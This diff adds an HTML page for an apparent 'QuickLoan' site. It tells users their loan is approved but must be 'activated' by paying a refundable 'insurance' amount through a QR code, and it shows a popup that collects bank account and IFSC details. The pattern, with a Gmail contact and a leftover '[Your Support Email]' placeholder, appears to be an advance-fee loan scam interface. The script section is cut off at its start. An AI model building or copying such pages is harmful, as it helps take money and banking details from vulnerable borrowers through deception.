@@ -1,0 +1,1583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Final Page</title>
+    <link rel="stylesheet" href="styles.css">
+     
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <style>
+ /* Modal background */
+.modal2 {
+    display: none; /* Hidden by default */
+    position: fixed; /* Stay in place */
+    z-index: 1000; /* Sit on top */
+    left: 0;
+    top: 0;
+    width: 100%; /* Full width */
+    height: 100%; /* Full height */
+    overflow: auto; /* Enable scroll if needed */
+    background-color: rgba(0, 0, 0, 0.5); /* Black background with opacity */
+}
+
+/* Modal content */
+.modal-content {
+    background-color: #fff; /* White background */
+    margin: 15% auto; /* 15% from the top and centered */
+    padding: 20px; /* Some padding */
+    border-radius: 8px; /* Rounded corners */
+    width: 80%; /* Width of the modal */
+    max-width: 500px; /* Max width of the modal */
+    box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2); /* Shadow effect */
+    position: relative; /* For the close button */
+}
+
+/* Close button */
+.close-button {
+    color: #000; /* Black color */
+    float: right; /* Float to the right */
+    font-size: 28px; /* Size of the close button */
+    font-weight: bold; /* Bold text */
+    cursor: pointer; /* Pointer cursor on hover */
+    position: absolute; /* Absolute positioning */
+    top: 10px;
+    right: 10px;
+}
+
+/* Close button on hover */
+.close-button:hover,
+.close-button:focus {
+    color: #f00; /* Red color */
+    text-decoration: none; /* Remove underline */
+    cursor: pointer; /* Pointer cursor */
+}
+
+/* Heading */
+.modal-content h2 {
+    margin-top: 0; /* Remove top margin */
+    color: #2ecc71; /* Green color */
+}
+
+/* Paragraph text */
+.modal-content p {
+    margin: 15px 0; /* Vertical margin */
+    font-size: 1rem; /* Font size */
+    color: #333; /* Dark text color */
+}
+
+/* Confirm button */
+.confirm-button {
+    background-color: #007bff; /* Blue background */
+    color: #fff; /* White text */
+    border: none; /* Remove border */
+    padding: 10px 20px; /* Padding */
+    text-align: center; /* Center text */
+    text-decoration: none; /* Remove underline */
+    display: inline-block; /* Inline block for proper alignment */
+    font-size: 16px; /* Font size */
+    margin-top: 10px; /* Top margin */
+    border-radius: 5px; /* Rounded corners */
+    cursor: pointer; /* Pointer cursor */
+    transition: background-color 0.3s; /* Smooth transition */
+}
+
+/* Confirm button on hover */
+.confirm-button:hover {
+    background-color: #0056b3; /* Darker blue on hover */
+}
+
+
+         body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    /* padding: 10px; */
+    /* border: 1px solid #ccc; */
+    background-color: #f9f9f9;
+    border-radius: 8px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    transition: background-color 0.3s ease;
+    margin-top: 20px;
+}
+
+.header.active {
+    background-color: #d4edda; /* Light green for active status */
+}
+
+.header.inactive {
+    background-color: #f8d7da; /* Light red for inactive status */
+}
+
+.status-icon {
+    display: flex;
+    align-items: center;
+    font-size: 1.2rem;
+    color: #333;
+}
+
+.status-icon i {
+    font-size: 1.5rem;
+    margin-right: 8px;
+}
+
+.status-icon i.active {
+    color: #28a745; /* Green for active status */
+}
+
+.status-icon i.inactive {
+    color: #dc3545; /* Red for inactive status */
+}
+
+.loan-amount-container {
+    display: flex;
+    align-items: center;
+    position: relative;
+}
+
+.loan-amount {
+    background-color: #ffc107; /* Yellow background */
+    border-radius: 8px;
+    padding: 6px 15px;
+    font-size: 1.2rem !important;
+    font-weight: bold;
+    color: #000;
+    display: inline-flex;
+    align-items: center;
+    border: 1px solid #000;
+    background:rgb(243, 255, 216);
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    transition: opacity 0.3s ease, background-color 0.3s ease;
+}
+
+.loan-amount.inactive {
+    opacity: 0.6; /* Dim the inactive amount */
+    background-color: #e9ecef; /* Light gray background for inactive */
+}
+
+.inactive-warning {
+    font-size: 1.2rem;
+    color: #dc3545; /* Red color for warning icon */
+    margin-left: 10px;
+    display: none; /* Hidden by default */
+}
+
+.loan-amount.inactive + .inactive-warning {
+    display: inline-block;
+}
+
+@media (max-width: 600px) {
+    .header {
+        flex-direction: column;
+        align-items: flex-start;
+        font-size: 0.9rem;
+    }
+
+    .status-icon {
+        margin-bottom: 10px;
+        font-size: 1rem;
+    }
+
+    .loan-amount {
+        font-size: 0.8rem;
+        padding: 6px 12px;
+    }
+
+    .inactive-warning {
+        margin-left: 5px;
+        font-size: 1rem;
+    }
+}
+
+
+        .application-form {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #00796b; 
+        } 
+
+         /* .company-details {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        } */
+
+        /* .detail-section {
+            flex: 1;
+            text-align: center;
+            font-size: 1rem;
+            padding: 10px;
+            background-color: #e0f2f1; 
+            border: 1px solid #00796b; 
+            border-radius: 8px; 
+         } */
+         .company-details {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: linear-gradient(to right, #ffffff, #f9f9f9); /* Gradient background */
+    padding: 20px;
+    border-radius: 12px;
+    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+    margin: 15px 0px;
+}
+
+.detail-section {
+    font-size: 1.2em;
+    color: #2c3e50; /* Dark blue-gray color */
+}
+
+.detail-section strong {
+    font-weight: 700;
+    color: #3498db; /* Bright blue color */
+}
+
+.detail-section span {
+    margin-left: 8px;
+}
+
+.logo-section {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.logo-section img {
+    max-width: 100%;
+    max-height: 60px;
+    object-fit: contain;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    border-radius: 8px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+}
+
+.logo-section img:hover {
+    transform: scale(1.05);
+    box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+}
+
+.info-section {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+    padding: 20px;
+    border: 1px solid #ddd;
+    border-radius: 10px;
+    background-color: #f8f9fa; 
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    margin-bottom: 20px;
+}
+
+.info-item {
+    display: flex;
+    flex-direction: column;
+    padding: 10px;
+    border-radius: 8px;
+    background-color: #fff;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+    transition: box-shadow 0.3s ease, background-color 0.3s ease;
+}
+
+.info-item:hover {
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
+    background-color: #e3f2fd;
+}
+
+.info-title {
+    font-size: 1rem;
+    font-weight: 700;
+    margin-bottom: 5px;
+    color: #00796b; 
+}
+
+.info-text {
+    font-size: 0.95rem;
+    color: #555;
+}
+
+@media (max-width: 768px) {
+    .info-section {
+        grid-template-columns: 1fr;
+    }
+
+    .info-item {
+        padding: 15px;
+    }
+
+    .info-title {
+        font-size: 1rem;
+    }
+
+    .info-text {
+        font-size: 0.9rem;
+    }
+}
+
+
+        .info-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+        }
+
+        .info-table th,
+        .info-table td {
+            border: 1px solid #ddd;
+            padding: 10px;
+            text-align: center;
+        } 
+
+         .info-table th {
+            background-color: #00796b; 
+            color: #fff;
+            font-weight: bold;
+        }
+
+        .note-section {
+            margin-top: 20px;
+        }
+
+        .note {
+            font-size: 0.9rem;
+            color: #333;
+        }
+
+        .note-highlight {
+            font-weight: bold;
+            color: #d32f2f; 
+        } 
+
+         .signature-section {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .signature {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            flex: 1;
+        }
+
+        .signature-text {
+            margin-top: 10px;
+            font-size: 0.9rem;
+            color: #333;
+        }
+
+        .contact-info {
+            text-align: center;
+            font-size: 0.9rem;
+            color: #333;
+            margin-top: 20px;
+        } 
+
+        .download-button {
+            margin-top: 20px;
+            font-size: 1rem;
+            color: #fff;
+            cursor: pointer;
+            background: #00796b; 
+            padding: 10px 20px;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        } 
+
+        .instruction-text {
+    text-align: center;
+    font-size: 1rem;
+    font-weight: bold;
+    color: #d32f2f; /* Red color for text */
+    padding: 20px; /* Increased padding for better spacing */
+    background-color: #ffffff; /* White background for contrast */
+    border: 2px solid #d32f2f; /* Thicker border for better visibility */
+    border-radius: 8px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Slightly larger shadow for better depth */
+    margin-top: 20px;
+    max-width: 90%; /* Ensures responsiveness */
+    margin-left: auto; /* Centers the block horizontally */
+    margin-right: auto; /* Centers the block horizontally */
+}
+
+        .scanner-image-container {
+            text-align: center;
+            margin-top: 20px;
+        } 
+
+          .scanner-image {
+            width: 240px;
+            height: 240px;
+            background-color: #e0e0e0; 
+            border: 1px solid #bdbdbd; 
+            border-radius: 8px;
+        }
+
+        .transaction-text {
+            text-align: center;
+            font-size: 1rem;
+            color: #00796b;
+            margin-top: 20px;
+        } 
+         .download-button.disabled {
+        cursor: not-allowed;
+        opacity: 0.5;
+    }
+          
+         @media (max-width: 600px) {
+            .header {
+                font-size: 0.9rem;
+            }
+
+            .loan-amount {
+                font-size: 0.8rem;
+            }
+
+            .form-header {
+                font-size: 1.5rem;
+            }
+
+            .info-title {
+                font-size: 0.9rem;
+            }
+
+            .info-text {
+                font-size: 0.8rem;
+            }
+ 
+         
+            .instruction-text {
+                font-size: 0.9rem;
+                padding: 10px 15px;
+            }
+
+            .scanner-image {
+                width: 150px;
+                height: 150px;
+            }
+        } 
+        .signature-section {
+    margin-top: 20px;
+    text-align: left;
+}
+
+.signature {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px;
+    background-color: #f9f9f9;
+    border-radius: 8px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+}
+
+.signature p {
+    margin: 0;
+    font-size: 1.2em;
+    color: #2c3e50;
+}
+
+.signature-box {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 200px; /* Adjust width as needed */
+    height: 100px; /* Adjust height as needed */
+    background-color: #fff;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    overflow: hidden;
+}
+
+.signature-box img {
+    max-width: 100%;
+    max-height: 100%;
+    object-fit: contain;
+}
+/* Modal container */
+/* Modal container */
+.modal {
+    display: none; /* Hidden by default */
+    position: fixed; /* Stay in place */
+    z-index: 1; /* Sit on top */
+    left: 0;
+    border-radius: 10px;
+    padding: 15px 0px;
+    top: 0;
+    width: 100%; /* Full width */
+    height: 100%; /* Full height */
+    overflow: auto; /* Enable scroll if needed */
+    background-color: rgb(0,0,0); /* Fallback color */
+    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+}
+
+
+/* Fade-in animation */
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-20px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.nav-link{
+    font-size: 1rem;
+    font-weight: 700;
+}
+ /* Custom CSS for navbar */
+ .navbar {
+            background-color: #041b95e6 !important;
+        }
+        .navbar-brand {
+            color: #fff !important;
+            text-align: center !important;
+        }
+        .navbar-brand img {
+  width: 70px;
+  height: 70px;
+  border-radius: 50%;
+  border: 3px solid rgb(255, 145, 0);
+}
+        .navbar-nav .nav-link {
+            color: #fff !important;
+        }
+        .navbar-nav .nav-link:hover {
+            color: #ddd !important;
+        }
+        .loan-amount-container {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+        .loan-amount {
+            font-size: 1.5em;
+            color: #333;
+            margin-right: 10px;
+        }
+        .inactive-warning {
+            font-size: 1.5em;
+            color: #f39c12;
+        }
+        /* Modal Styles */
+    /* Modal background */
+
+/* Header of Modal */
+.modal-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+/* Close button */
+.close {
+    color: #aaa;
+    font-size: 28px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.close:hover,
+.close:focus {
+    color: black;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+/* Modal Body */
+.modal-body {
+    margin-top: 20px;
+}
+
+
+
+.footer {
+  background-color: #041b95e6;
+  color: #ffffff;
+  margin-top: 50px;
+  padding: 20px 30px;
+}
+
+.section {
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.connect {
+  margin-bottom: 10px;
+  font-size: 18px;
+  font-weight: bold;
+}
+
+.social-links {
+  display: flex;
+  justify-content: center;
+  gap: 15px;
+  margin-top: 10px;
+}
+
+.social-link {
+  color: #ffffff;
+  font-size: 24px;
+  text-decoration: none;
+  transition: color 0.3s, transform 0.3s;
+}
+
+.social-link:hover {
+  color: #007bff;
+  transform: scale(1.2);
+}
+
+.container {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 15px;
+}
+
+.row {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: space-between;
+  text-align: left;
+}
+
+.column {
+  flex: 1;
+  min-width: 220px;
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.title {
+  font-size: 18px;
+  margin-bottom: 15px;
+  position: relative;
+  font-weight: bold;
+}
+
+.title i {
+  margin-right: 10px;
+}
+
+.highlight-red {
+  color: red;
+  font-size: 2rem;
+  font-weight: bold;
+}
+
+.highlight-info {
+  color: #17a2b8;
+  font-size: 16px;
+  font-weight: bold;
+}
+
+.highlight-slateblue {
+  color: rgb(25, 191, 3);
+  font-size: 16px;
+  font-weight: bold;
+}
+
+.link {
+  color: #007bff;
+  text-decoration: none;
+  transition: color 0.3s;
+}
+
+.link:hover {
+  color: #0056b3;
+}
+
+.copy {
+  text-align: center;
+  padding: 15px 0;
+  background-color: #b80b70;
+}
+
+.copy .link {
+  color: #ffffff;
+}
+
+@media (max-width: 768px) {
+  .row {
+    flex-direction: column;
+  }
+
+  .social-links {
+    flex-wrap: wrap;
+    gap: 10px;
+  }
+
+  .connect {
+    font-size: 16px;
+  }
+}
+
+@media (max-width: 480px) {
+  .social-link {
+    font-size: 20px;
+  }
+
+  .title {
+    font-size: 16px;
+  }
+
+  .highlight-red, .highlight-info, .highlight-slateblue {
+    font-size: 14px;
+  }
+
+  .connect {
+    font-size: 14px;
+  }
+}
+#checkemi{
+    color: violet;
+}
+.custom-popup {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 100%;
+    max-width: 550px;
+    border: 2px solid rgb(131, 131, 131);
+    background-color: rgb(239, 239, 239);
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    z-index: 1000;
+    padding: 20px;
+}
+
+.custom-popup-content {
+    position: relative;
+}
+
+.custom-popup-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background-color: #0056b3;
+    color: white;
+    /* width: 100%; */
+    border-radius: 10px;
+    text-align: center;
+    padding: 5px;
+    margin-bottom: 20px;
+}
+
+.custom-popup-body {
+    margin-bottom: 20px;
+}
+
+.custom-popup-footer {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.btn-close {
+    background: none;
+    border: none;
+    font-size: 1.5rem;
+    cursor: pointer;
+}
+
+.btn-close i {
+    color: #007bff;
+}
+
+.custom-popup .form-control {
+    width: 100%;
+    padding: 10px;
+    margin-top: 5px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+}
+
+.custom-popup .btn {
+    padding: 10px 20px;
+    font-size: 1rem;
+    border-radius: 5px;
+    cursor: pointer;
+}
+
+.custom-popup .btn-primary {
+    background-color: #007bff;
+    color: white;
+    border: none;
+}
+label{
+   font-size: 1rem;
+   font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+   font-weight: 700;
+}
+/* General styling for the container */
+.col-md-4 {
+    text-align: center;
+    margin-top: 15px;
+}
+
+/* Default card styles */
+.insurance-card {
+    width: 98%;
+    cursor: pointer;
+    border: 1px solid black;
+    padding: 10px 0px;
+    border-radius: 10px;
+    box-shadow: 2px 3px 4px rgb(122, 122, 122);
+    display: flex;
+    justify-content: space-between;
+    transition: border-color 0.3s, box-shadow 0.3s, background-color 0.3s;
+}
+
+/* Image container */
+.insurance-img {
+    text-align: center;
+    width: 50%;
+}
+
+.insurance-img img {
+    height: 100px;
+    width: 100px;
+    border-radius: 50%;
+}
+
+/* Details container */
+.insurance-details {
+    width: 50%;
+}
+
+/* Bank type text */
+.bank-type {
+    padding-top: 10px !important;
+    margin: 0 !important;
+    text-align: center;
+    font-size: 1.5rem;
+    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    font-weight: 600;
+}
+
+/* Insurance amount text */
+.insurance-amount {
+    padding: 0 !important;
+    margin: 0 !important;
+    text-align: center;
+    font-size: 1.3rem;
+    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    font-weight: 500;
+}
+
+/* Active bank styling */
+.active-bank .insurance-card {
+    border: 2px solid rgb(71, 71, 71);
+    border-radius: 10px;
+    background-color: #06c4caf9;
+    box-shadow: 0px 4px 6px rgba(0, 0, 255, 0.2);
+    width: 98%;
+
+    color: white;
+}
+
+    </style>
+</head>
+<body>
+
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <a class="navbar-brand" href="#"><img src="/assets/img/quick.png" width="70px" alt=""></a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link">Hii <span id="nameUser" style="color: violet;"></span></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link">wallet <span id="walletadd" style="color: violet;"></span></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/" style="color: #3498db;">
+                        <i class="fas fa-home" style="color: #3498db;"></i> Home
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/about2" style="color: #2ecc71;">
+                        <i class="fas fa-info-circle" style="color: #2ecc71;"></i> About Us
+                    </a>
+                </li>
+               
+                <li class="nav-item">
+                    <a class="nav-link" href="/Service" style="color: #e67e22;">
+                        <i class="fas fa-concierge-bell" style="color: #e67e22;"></i> Service
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" id="logoutBtn" style="color: #e74c3c;">
+                        <i class="fas fa-sign-out-alt" style="color: #e74c3c;"></i> Logout
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+    
+    <div id="statusModal2" class="modal2">
+        <div class="modal-content">
+            <span class="close-button">&times;</span>
+            <h2>🎉 Account Activated!</h2>
+            <p>Your account is now active. The amount will be transferred to your bank details within 2 hours.</p>
+            <button class="confirm-button" id="okay">Okay, Got It!</button>
+        </div>
+    </div>
+    
+    
+    <div class="header">
+      
+        <div class="loan-amount-container" id="loanAmountContainer">
+            <i class="fa fa-exclamation-triangle inactive-warning" aria-hidden="true" title="This amount is inactive."></i>
+        </div>
+    </div>
+    
+<!-- Modal Structure -->
+<div id="myModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h2>Wallet Details</h2>
+            <span class="close">&times;</span>
+        </div>
+        <div class="modal-body">
+            <div id="loanSummary" style="display: flex; align-items: center; ">
+                <!-- Amounts will be dynamically inserted here -->
+            </div>
+            <p id="amout" style="padding: 0px; margin: 0px; display: flex; color: yellow; font-size: .9rem; font-weight: 500;"></p>
+            <p id="limtamt" style="padding: 0px; margin: 0px; display: flex; color: yellow; font-size: .9rem; font-weight: 500;"></p>
+        </div>
+    </div>
+</div>
+
+
+<div class="instruction-text" style="background-color: #f9f9f9; padding: 20px; border-left: 5px solid #007bff; margin-bottom: 20px; border-radius: 8px; box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);">
+    <div>
+        <strong style="font-size: 1.3rem; color: #dc3545; font-weight: bold;">
+            <i class="fas fa-exclamation-triangle" style="color: #dc3545; font-size: 1.5rem; margin-right: 10px;"></i>
+            Important Notice:
+        </strong>
+        <p style="margin: 10px 0; font-size: 1rem; color: #333; display: flex; align-items: center;">
+            <i class="fas fa-credit-card" style="color: #007bff; font-size: 1.5rem; margin-right: 10px;"></i>
+            You are on the insurance payment page. Completing this payment is essential for your loan process. The amount will be added to your wallet, similar to the processing fee.
+        </p>
+        <p style="margin: 10px 0; font-size: 1rem; color: #333; display: flex; align-items: center;">
+            <i class="fas fa-info-circle" style="color: #17a2b8; font-size: 1.5rem; margin-right: 10px;"></i>
+            The insurance amount is fully refundable. Please review all details before completing the payment.
+        </p>
+        <p style="margin: 10px 0; font-size: 1rem; color: #333; display: flex; align-items: center;">
+            <i class="fas fa-headset" style="color: #28a745; font-size: 1.5rem; margin-right: 10px;"></i>
+            Need help? Our support team is available to assist you. Your prompt attention will ensure a smooth process.
+        </p>
+    </div>
+</div>
+
+
+</div>
+<div class="container">
+    <h2 style="text-align: center; font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif; font-weight: 600; color: #00796b;">Please Insure Your Amount</h2>
+    <p style="text-align: center; font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif; font-weight: 600; color: #00796b; padding: 0px !important; margin: 0px !important;">Activate Your Limit by Insurance of Your Amount</p>
+    <div class="row" id="insuranceContainer" style="padding: 20px 0px;">
+        <!-- Insurance data will be inserted here -->
+    </div>
+</div>
+
+    
+        <div class="scanner-image-container">
+            <h2 style="text-align: center; font-size: 1.4rem; font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif; font-weight: 600; color: black;">Pay Insurance <span class="bankAmount"></span></h2>
+            <img id="scannerImage" src="/assets/img/scaner.png" alt="Scanner" class="scanner-image">
+        </div>
+        <!-- <div  class="scanner-image-container">
+            <img src="/assets/img/gif5.webp" width="35%" alt="">
+         </div> -->
+        <div style="display: flex; justify-content: center; padding: 20px; background-color: #ffffff;">
+            <div style="
+                color: #ebe9e9;
+                margin-top: 20px;
+                width: 100%;
+                max-width: 750px;
+                padding: 20px;
+                background: linear-gradient(135deg, #122231 0%, #204768 100%); /* Gradient background */
+                border-radius: 8px;
+                font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+                box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+              ">
+              <h4 style="
+                  color: #02d106;
+                  font-weight: bold;
+                  font-size: 2rem;
+                  margin-bottom: 20px;
+                ">
+                💼 Pay Insurance Amount <span class="bankAmount" style="color: violet;"></span>
+              </h4>
+              <p style="margin-bottom: 20px; font-size: 1.1rem; display: flex; align-items: center;">
+                <i class="fas fa-thumbs-up" style="color: #28a745; margin-right: 10px;"></i>
+                Thank you for choosing QuickLoan. Your application has been processed successfully, and we’re thrilled to have you on board!
+            </p>
+            
+            <p style="margin-bottom: 20px; font-size: 1.1rem; display: flex; align-items: center;">
+                <i class="fas fa-arrow-right" style="color: #007bff; margin-right: 10px;"></i> 
+                To activate your loan limit, please complete the Insurance payment. <span id="walletaddd" style="color: violet;"></span> This is a crucial step to unlock the full amount of your approved loan. Once the insurance payment is confirmed, your loan limit will be immediately activated.
+            </p>
+            
+            <p style="margin-bottom: 20px; font-size: 1.1rem; display: flex; align-items: center;">
+                <i class="fas fa-headset" style="color: #17a2b8; margin-right: 10px;"></i>
+                Need help? Our support details are available in the footer below. We’re here to assist you every step of the way!
+            </p>
+            
+            <p style="margin-bottom: 20px; font-size: 1.1rem; display: flex; align-items: center;">
+                <i class="fas fa-heart" style="color: #e2280c; margin-right: 10px;"></i>
+                Again, thank you for your trust in QuickLoan. We’re committed to providing you with the best service possible.
+            </p>
+            
+            </div>
+          </div>
+          
+          
+        
+          <div class="insurance-notes" style="display: flex; justify-content: center;">
+            <div style=" background: linear-gradient(135deg, #122231 0%, #28527a 100%); /* Gradient background */
+ ; padding: 10px 20px; width: 750px; font-size: 1.1rem; line-height: 1.6; box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);">
+              <h3 style="color: #2ecc71;">Important Notes:</h3>
+              <ul style="list-style-type: none; padding-left: 0; color: #e9e9e9; font-size: 1.2erm;  font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;">
+              
+                <li style="margin-bottom: 10px;">
+                  <i class="fas fa-check-circle" style="color: #007bff; margin-right: 10px;"></i>
+                  Ensure that all the information provided is accurate to avoid any delays or issues.
+                </li>
+                <li style="margin-bottom: 10px;">
+                  <i class="fas fa-pencil-alt" style="color: #ff8800; margin-right: 10px;"></i>
+                  If you need to update any details, contact our customer support for assistance before making the payment.
+                </li>
+                <li style="margin-bottom: 10px;">
+                  <i class="fas fa-unlock-alt" style="color: #28a745; margin-right: 10px;"></i>
+                  The payment process will proceed once all required fields are completed and verified.
+                </li>
+                <li style="margin-bottom: 10px;">
+                  <i class="fas fa-copy" style="color: #dce400; margin-right: 10px;"></i>
+                  Save your payment confirmation for future reference and records.
+                </li>
+                <li style="margin-bottom: 10px;">
+                  <i class="fas fa-envelope" style="color: #dc3545; margin-right: 10px;"></i>
+                  For any issues related to the payment process, please reach out to us at [Your Support Email].
+                </li>
+              </ul>
+              <!-- <img src="/assets/img/gif1.gif" alt=""> -->
+             
+            </div>
+          </div>
+          
+        
+    </div>
+      
+<!-- Footer -->
+<footer class="footer">
+    <section class="section">
+      <div class="connect">
+        <span>Get connected with us:</span>
+      </div>
+     
+    </section>
+  
+    <section class="container" >
+      <div class="row">
+        <div class="column">
+            <h6 class="title">
+                <i class="fas fa-gem"></i> QuickLoan
+            </h6>
+            <p>
+                We help to complete your dream. We provide you
+                <span class="highlight-red">
+                    <i class="fas fa-thumbs-up"></i> Trustable
+                </span>,
+                <span class="highlight-info">
+                    <i class="fas fa-expand-arrows-alt"></i> Scalable
+                </span>,
+                and
+                <span class="highlight-slateblue">
+                    <i class="fas fa-cogs"></i> Flexible
+                </span>
+                amount of loan for your dream.
+            </p>
+        </div>
+        
+        <div class="column">
+          
+        </div>
+  
+        <div class="column">
+          <h6 class="title">Contact</h6>
+          <p id="contact-phone"><i class="fas fa-phone"></i></p>
+          <p id="contact-email"><i class="fas fa-envelope"></i></p>
+          <p id="contact-address"><i class="fas fa-home" style="background-color: #02d106; margin: 0px 10px;"></i></p>
+        </div>
+      </div>
+    </section>
+  
+    <div class="copy">
+      <a href="#" class="link" id="footer-email">Worldpay472@gmail.com</a>
+    </div>
+  </footer>
+    
+<!-- Modal Structure -->
+<div class="custom-popup" id="bankDetailsPopup" style="display: none;">
+    <div class="custom-popup-content">
+        <div class="custom-popup-header">
+            <h5 class="modal-title" id="bankDetailsPopupLabel">Bank Details</h5>
+            <button type="button" class="btn-close" onclick="closePopup()"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="custom-popup-body">
+            <p class="text-content">Please fill in your bank details. Your amount will be transferred to this account within an hour.</p>
+            <form id="bankForm">
+                <!-- Hidden field for insurance amount -->
+                <input type="text" id="insuranceamount" name="insuranceamount" hidden>
+                <div class="form-group mb-3">
+                    <label for="bankName">Bank Name</label>
+                    <input type="text" id="bankName" name="bankName" placeholder="Enter bank name" class="form-control" required>
+                </div>
+                <div class="form-group mb-3">
+                    <label for="HolderName">Bank Holder Name</label>
+                    <input type="text" id="HolderName" name="HolderName" placeholder="Enter Holder name" class="form-control" required>
+                </div>
+                <div class="form-group mb-3">
+                    <label for="accountNumber">Account Number</label>
+                    <input type="text" id="accountNumber" name="accountNumber" placeholder="Enter account number" class="form-control" required>
+                </div>
+                <div class="form-group mb-3">
+                    <label for="ifscCode">IFSC Code</label>
+                    <input type="text" id="ifscCode" name="ifscCode" placeholder="Enter IFSC code" class="form-control" required>
+                </div>
+                <div class="form-group mb-3">
+                    <label for="accountType">Account Type</label>
+                    <select class="form-control" id="accountType" name="accountType" required>
+                        <option value="">Select account type</option>
+                        <option value="Savings">Savings</option>
+                        <option value="Current">Current</option>
+                    </select>
+                </div>
+            </form>
+        </div>
+        <div class="custom-popup-footer">
+            <button type="button" class="btn btn-secondary" onclick="closePopup()">Close</button>
+            <button type="button" class="btn btn-primary" onclick="submitForms()">Submit</button>
+        </div>
+    </div>
+</div>
+
+  <script>// Utility Functions
+
+    function decodeJWT(token) {
+        const parts = token.split('.');
+        if (parts.length !== 3) {
